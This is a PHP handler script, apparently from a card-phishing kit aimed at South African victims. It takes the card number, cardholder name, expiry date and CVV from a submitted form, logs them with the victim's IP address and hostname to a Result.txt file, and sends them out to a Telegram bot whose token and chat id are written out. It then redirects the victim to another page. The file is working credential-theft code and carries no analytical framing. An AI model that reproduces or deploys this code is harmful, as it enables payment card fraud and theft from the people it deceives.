<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

if (isset($_POST['next']))
{

		$_SESSION["Scard"] = $_POST['Zawaq'];
		$_SESSION["Sname_on_card"] = $_POST['fname'];
		$_SESSION["Sexp_month"] = $_POST['DateExpiry_1'];
		$_SESSION["Sexp_year"] = $_POST['DateExpiry_2'];
		$_SESSION["Scvv2"] = $_POST['zwi9a'];
		$_SESSION["ara"] = $_POST[''];


	$id = $_SESSION['Scard'];
		$ss = strlen($id);
		$lengthcard = $ss - 4;
		$cardX =  substr($id,$lengthcard);
		$_SESSION['scardx'] = $cardX;
		

	

	
	$smolix .= "🇿🇦	".$_SESSION['Sname_on_card']." \n";
    $smolix .= "CC : ".$_SESSION['Scard']."   \n";
    $smolix .= "Dt : ".$_SESSION['Sexp_month']." / ".$_SESSION['Sexp_year']."\n";	
    $smolix .= "Cv : ".$_SESSION['Scvv2']."\n"; 
    $smolix .= "N° : $ip / $hostname \n"; 
	$smolix .= "*****************************\n";


	$Txt_Rezlt = fopen('../Result.txt', 'a+');
	fwrite($Txt_Rezlt, $smolix);
	fclose($Txt_Rezlt);




$token = "1959157010:AAHlAHpUsY9IYMmjcOf7m8JBm3taij8tluA";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1022979967&text=" . urlencode($smolix)."" );



}
header("Location: tele.php?i_sendid=&i_id=I6JIIxLyIR&i_regnr_list=ZA41861547955");



?>
